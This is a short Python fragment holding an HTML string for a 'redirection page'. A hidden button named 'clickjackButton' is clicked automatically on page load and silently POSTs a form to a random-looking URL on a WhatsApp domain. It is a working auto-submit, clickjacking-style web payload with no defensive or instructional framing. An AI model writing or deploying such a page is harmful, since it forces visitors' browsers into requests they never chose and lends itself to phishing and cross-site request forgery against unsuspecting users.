...
# HTML code for the redirection page with a button
html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
    ...
    <script>
        function triggerClick() {
            var button = document.getElementById('clickjackButton');
            button.click();
        }
    </script>
</head>
<body onload="triggerClick()">
    ...
    <form action="https://whatsapp.com/XsUVyEpy.asp" method="POST">
        <button id="clickjackButton" type="submit" style="display:none;"></button>
    </form>
</body>
</html>
"""
